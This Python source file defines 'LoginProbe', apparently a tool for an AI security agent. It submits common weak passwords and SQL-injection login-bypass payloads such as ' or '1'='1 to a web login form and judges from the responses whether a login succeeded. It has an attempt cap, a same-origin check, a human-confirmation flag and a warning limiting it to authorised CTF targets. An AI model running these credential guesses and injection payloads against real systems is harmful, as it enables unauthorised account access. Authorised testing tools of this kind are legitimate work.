import asyncio
from html.parser import HTMLParser
from typing import Any
from urllib.parse import urljoin, urlsplit

import httpx

from secagent.domain import RiskLevel, ToolResult
from secagent.security.redaction import redact_text
from secagent.security.url_guard import UrlGuard
from secagent.tools.base import BaseTool, ToolContext


COMMON_USERNAMES = ("admin", "test", "user", "root", "guest", "ctf")
COMMON_PASSWORDS = (
    "admin",
    "password",
    "123456",
    "12345678",
    "admin123",
    "root",
    "guest",
    "test",
    "ctf",
    "flag",
)
UNIVERSAL_PAYLOADS = (
    "' or '1'='1",
    "' or 1=1--",
    "admin'--",
    "admin' #",
    "\" or \"1\"=\"1",
)
FAILURE_KEYWORDS = (
    "invalid",
    "incorrect",
    "wrong",
    "failed",
    "error",
    "用户名或密码错误",
    "密码错误",
    "登录失败",
    "无效",
)
SUCCESS_KEYWORDS = (
    "logout",
    "dashboard",
    "profile",
    "welcome",
    "flag",
    "退出",
    "后台",
    "欢迎",
)


class _LoginFormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, Any]] = []
        self.current: dict[str, Any] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        values = {key.lower(): value or "" for key, value in attrs}
        if tag.lower() == "form":
            self.current = {
                "action": values.get("action", ""),
                "method": (values.get("method") or "get").lower(),
                "inputs": [],
            }
            self.forms.append(self.current)
            return
        if tag.lower() != "input" or self.current is None:
            return
        name = values.get("name")
        if not name:
            return
        self.current["inputs"].append(
            {
                "name": name,
                "type": (values.get("type") or "text").lower(),
                "value": values.get("value", ""),
            }
        )

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form":
            self.current = None


class LoginProbe(BaseTool):
    name = "login_probe"
    scene = "web_analysis"
    risk_level = RiskLevel.MEDIUM
    idempotent = False
    requires_human_confirm = True
    timeout_seconds = 180.0
    description = (
        "对授权登录页面进行小规模弱口令和万能密码探测；"
        "该动作会提交登录表单，是否执行由系统安全策略决定。"
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url": {"type": "string"},
            "username_field": {"type": "string"},
            "password_field": {"type": "string"},
            "max_attempts": {"type": "integer", "minimum": 1, "maximum": 40},
        },
        "required": ["url"],
    }

    def __init__(self, guard: UrlGuard) -> None:
        self.guard = guard

    async def run(self, params: dict, context: ToolContext) -> ToolResult:
        del context
        url = self.guard.check(self._required_url(params.get("url"))).geturl()
        max_attempts = self._bounded_int(params.get("max_attempts"), 20, 1, 40)
        timeout = httpx.Timeout(8.0)
        async with httpx.AsyncClient(
            follow_redirects=False,
            timeout=timeout,
            trust_env=False,
        ) as client:
            page = await self._fetch_login_page(client, url)
            form = self._select_form(
                page["body"],
                url,
                params.get("username_field"),
                params.get("password_field"),
            )
            if form is None:
                return ToolResult(
                    success=False,
                    summary="未在目标页面识别到包含密码字段的登录表单。",
                    error="login_form_not_found",
                    warnings=["请先通过浏览器快照或页面获取确认登录表单位置。"],
                )
            attempts = self._candidate_attempts(max_attempts)
            baseline = self._baseline(page)
            findings: list[dict[str, Any]] = []
            for index, candidate in enumerate(attempts, start=1):
                await asyncio.sleep(0.08)
                result = await self._submit(client, form, candidate)
                decision = self._judge(result, baseline)
                if decision["likely_success"]:
                    findings.append(
                        {
                            "kind": candidate["kind"],
                            "attempt": index,
                            "username": candidate["username"],
                            "password": candidate["password"],
                            "reason": decision["reason"],
                            "status_code": result["status_code"],
                            "location": result.get("location"),
                        }
                    )
                    break
            return self._result(url, form, attempts, findings)

    async def _fetch_login_page(
        self, client: httpx.AsyncClient, url: str
    ) -> dict[str, Any]:
        self.guard.check(url)
        response = await client.get(url)
        body = response.text[:500_000]
        return {
            "url": str(response.url),
            "status_code": response.status_code,
            "headers": dict(response.headers),
            "body": body,
        }

    def _select_form(
        self,
        html: str,
        base_url: str,
        username_field: object,
        password_field: object,
    ) -> dict[str, Any] | None:
        parser = _LoginFormParser()
        parser.feed(html)
        for form in parser.forms:
            password = self._field_name(password_field) or self._password_field(form)
            if not password:
                continue
            username = self._field_name(username_field) or self._username_field(form)
            if not username:
                continue
            action = urljoin(base_url, str(form.get("action") or ""))
            parsed = self.guard.check(action)
            if not self._same_origin(base_url, parsed.geturl()):
                continue
            return {
                "action": parsed.geturl(),
                "method": str(form.get("method") or "post").lower(),
                "username_field": username,
                "password_field": password,
                "extra_fields": self._extra_fields(form, {username, password}),
            }
        return None

    @staticmethod
    def _password_field(form: dict[str, Any]) -> str | None:
        for item in form.get("inputs", []):
            if item.get("type") == "password":
                return str(item["name"])
        return None

    @staticmethod
    def _username_field(form: dict[str, Any]) -> str | None:
        candidates = ("user", "name", "login", "email", "account", "id")
        for item in form.get("inputs", []):
            name = str(item.get("name", ""))
            field_type = str(item.get("type", "text"))
            if field_type in {"hidden", "submit", "button", "password"}:
                continue
            lowered = name.lower()
            if any(token in lowered for token in candidates):
                return name
        for item in form.get("inputs", []):
            name = str(item.get("name", ""))
            field_type = str(item.get("type", "text"))
            if field_type not in {"hidden", "submit", "button", "password"}:
                return name
        return None

    @staticmethod
    def _extra_fields(form: dict[str, Any], excluded: set[str]) -> dict[str, str]:
        fields: dict[str, str] = {}
        for item in form.get("inputs", []):
            name = str(item.get("name", ""))
            if not name or name in excluded:
                continue
            field_type = str(item.get("type", "text"))
            if field_type in {"submit", "button", "reset", "file"}:
                continue
            fields[name] = str(item.get("value", ""))
        return fields

    async def _submit(
        self,
        client: httpx.AsyncClient,
        form: dict[str, Any],
        candidate: dict[str, str],
    ) -> dict[str, Any]:
        data = dict(form["extra_fields"])
        data[form["username_field"]] = candidate["username"]
        data[form["password_field"]] = candidate["password"]
        method = "get" if form["method"] == "get" else "post"
        if method == "get":
            response = await client.get(form["action"], params=data)
        else:
            response = await client.post(form["action"], data=data)
        body = response.text[:200_000]
        return {
            "status_code": response.status_code,
            "location": response.headers.get("location", ""),
            "set_cookie": response.headers.get("set-cookie", ""),
            "body": body,
        }

    @staticmethod
    def _baseline(page: dict[str, Any]) -> dict[str, Any]:
        body = str(page.get("body", "")).lower()
        return {
            "body_len": len(body),
            "has_password": "password" in body,
            "failure_count": sum(1 for word in FAILURE_KEYWORDS if word in body),
        }

    @staticmethod
    def _judge(result: dict[str, Any], baseline: dict[str, Any]) -> dict[str, Any]:
        body = str(result.get("body", ""))
        lowered = body.lower()
        location = str(result.get("location", ""))
        if result["status_code"] in {301, 302, 303, 307, 308} and location:
            return {
                "likely_success": True,
                "reason": f"登录请求返回跳转响应，Location={redact_text(location, include_generic_key=True)}",
            }
        if any(word in body for word in SUCCESS_KEYWORDS) or any(
            word in lowered for word in SUCCESS_KEYWORDS
        ):
            return {"likely_success": True, "reason": "响应中出现登录成功或题目线索关键词。"}
        if result.get("set_cookie") and not any(
            word in lowered for word in FAILURE_KEYWORDS
        ):
            return {"likely_success": True, "reason": "响应设置了 Cookie，且未出现常见失败提示。"}
        if any(word in body for word in FAILURE_KEYWORDS) or any(
            word in lowered for word in FAILURE_KEYWORDS
        ):
            return {"likely_success": False, "reason": "响应中出现常见登录失败提示。"}
        if baseline["has_password"] and "password" not in lowered:
            return {"likely_success": True, "reason": "响应不再包含密码登录表单，疑似进入登录后页面。"}
        return {"likely_success": False, "reason": "未观察到足够的成功特征。"}

    @staticmethod
    def _candidate_attempts(max_attempts: int) -> list[dict[str, str]]:
        attempts: list[dict[str, str]] = []
        for username in COMMON_USERNAMES:
            for password in COMMON_PASSWORDS:
                attempts.append(
                    {
                        "kind": "weak_password",
                        "username": username,
                        "password": password,
                    }
                )
        for payload in UNIVERSAL_PAYLOADS:
            attempts.append(
                {
                    "kind": "universal_password",
                    "username": payload,
                    "password": "1",
                }
            )
            attempts.append(
                {
                    "kind": "universal_password",
                    "username": "admin",
                    "password": payload,
                }
            )
        return attempts[:max_attempts]

    @staticmethod
    def _result(
        url: str,
        form: dict[str, Any],
        attempts: list[dict[str, str]],
        findings: list[dict[str, Any]],
    ) -> ToolResult:
        success = bool(findings)
        summary = (
            "登录探测发现疑似可用弱口令或万能密码。"
            if success
            else f"登录探测完成，{len(attempts)} 次小字典尝试未确认可用凭据。"
        )
        safe_action = redact_text(str(form["action"]), include_generic_key=True)
        content = [summary, f"登录表单：{safe_action}。", f"尝试次数：{len(attempts)}。"]
        for item in findings:
            content.append(
                "疑似成功凭据："
                f"username={item['username']} password={item['password']}；"
                f"依据：{item['reason']}。"
            )
        return ToolResult(
            success=True,
            summary=summary,
            findings=findings,
            evidence=[
                {
                    "evidence_type": "login_probe",
                    "source": redact_text(url, include_generic_key=True),
                    "content": "\n".join(content),
                    "confidence": 0.82 if success else 0.58,
                    "metadata": {
                        "url": redact_text(url, include_generic_key=True),
                        "form_action": safe_action,
                        "attempt_count": len(attempts),
                        "found": success,
                        "findings": findings,
                    },
                }
            ],
            metrics={
                "attempt_count": len(attempts),
                "found": success,
                "engine": "bounded_login_probe",
            },
            warnings=["该工具会提交登录表单，只适用于明确授权的 CTF/靶场目标。"],
        )

    @staticmethod
    def _required_url(value: object) -> str:
        if not isinstance(value, str) or not value.strip():
            raise ValueError("url is required")
        return value.strip()

    @staticmethod
    def _field_name(value: object) -> str | None:
        if not isinstance(value, str) or not value.strip():
            return None
        return value.strip()

    @staticmethod
    def _bounded_int(value: object, default: int, minimum: int, maximum: int) -> int:
        try:
            number = int(value)
        except (TypeError, ValueError):
            return default
        return max(minimum, min(maximum, number))

    @staticmethod
    def _same_origin(base_url: str, candidate: str) -> bool:
        base = urlsplit(base_url)
        parsed = urlsplit(candidate)
        return base.scheme == parsed.scheme and base.netloc == parsed.netloc


__all__ = ["LoginProbe"]
